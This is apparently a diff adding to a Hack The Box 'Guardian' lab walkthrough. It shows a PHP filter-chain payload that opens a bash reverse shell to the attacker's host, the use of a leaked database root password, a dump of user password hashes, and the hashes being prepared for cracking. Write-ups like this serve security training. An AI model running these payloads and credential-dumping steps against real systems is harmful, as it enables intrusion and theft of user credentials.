@@ -408,5 +408,119 @@ https://github.com/synacktiv/php_filter_chain_generator
 
 <img width="1239" height="438" alt="image" src="https://github.com/user-attachments/assets/7e124a92-a508-4371-967c-99b340ee202b" />
 
+```
+Hexada@hexada ~/pentest-env/pentesting-tools/php_filter_chain_generator$ nc -lvnp 1919  
+```
 
+```
+(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/php_filter_chain_generator$ python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.16.83/1919 0>&1'\''");?>' 
+[+] The following gadget chain will generate the following code : <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.83/1919 0>&1'");?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjgzLzE5MTkgMD4mMSciKTs/Pg)
+```
 
+<img width="1066" height="111" alt="image" src="https://github.com/user-attachments/assets/e7c53f5f-91c1-4a19-a764-a59c148a4033" />
+
+```php
+<?php
+return [
+    'db' => [
+        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
+        'username' => 'root',
+        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
+        'options' => []
+    ],
+    'salt' => '8Sb)tM1vs1SS'
+];
+```
+
+```
+www-data@guardian:/$ netstat -tunlp
+netstat -tunlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -  
+```
+
+```
+php_filter_chain_generator$ nc -lvnp 1919 1 ↵ main Connection from 10.10.11.84:49968 bash: cannot set terminal process group (966): Inappropriate ioctl for device bash: no job control in this shell www-data@guardian:~/portal.guardian.htb/admin$ mysql -h 127.0.0.1 -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb <0.0.1 -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb mysql: [Warning] Using a password on the command line interface can be insecure. show databases;
+```
+
+у меня была проблема, поэтому я решил изучать систему другим способом
+
+```
+www-data@guardian:~/portal.guardian.htb/admin$ mysql -h 127.0.0.1 -uroot -p'Gu4rd14n_un1_1s_th3_b3st' -e "SHOW DATABASES;"
+<t -p'Gu4rd14n_un1_1s_th3_b3st' -e "SHOW DATABASES;"
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Database
+guardiandb
+information_schema
+mysql
+performance_schema
+sys
+```
+
+```
+www-data@guardian:~/portal.guardian.htb/admin$ mysql -uroot -p'Gu4rd14n_un1_1s_th3_b3st' -D guardiandb -e "SELECT username, password_hash FROM users;"
+<ndb -e "SELECT username, password_hash FROM users;"
+mysql: [Warning] Using a password on the command line interface can be insecure.
+username        password_hash
+admin   694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6
+jamil.enockson  c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
+mark.pargetter  8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
+valentijn.temby 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6
+leyla.rippin    7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61
+perkin.fillon   4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471
+cyrus.booth     23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6
+sammy.treat     c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2
+crin.hambidge   9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75
+myra.galsworthy ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4
+mireielle.feek  18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3
+vivie.smallthwaite      b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a
+
+...
+```
+
+```
+Hexada@hexada ~/pentest-env/htb/vrm/Guardian.htb$ cat hashes                                                                                                      
+admin   694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6
+jamil.enockson  c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
+mark.pargetter  8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
+valentijn.temby 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6
+leyla.rippin    7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61
+perkin.fillon   4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471
+cyrus.booth     23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6
+sammy.treat     c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2
+crin.hambidge   9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75
+myra.galsworthy ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4
+mireielle.feek  18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3
+vivie.smallthwaite      b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a
+```
+
+```
+awk '{print $1 ":" $2 ":8Sb)tM1vs1SS"}' hashes > hashes_hashcat.txt 
+```
+
+```
+Hexada@hexada ~/pentest-env/htb/vrm/Guardian.htb$ cat hashes_hashcat.txt                                                                                          
+admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
+jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
+mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
+valentijn.temby:1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6:8Sb)tM1vs1SS
+leyla.rippin:7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61:8Sb)tM1vs1SS
+perkin.fillon:4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471:8Sb)tM1vs1SS
+cyrus.booth:23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6:8Sb)tM1vs1SS
+sammy.treat:c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
+crin.hambidge:9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8Sb)tM1vs1SS
+myra.galsworthy:ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
+mireielle.feek:18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
+vivie.smallthwaite:b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
+
+```
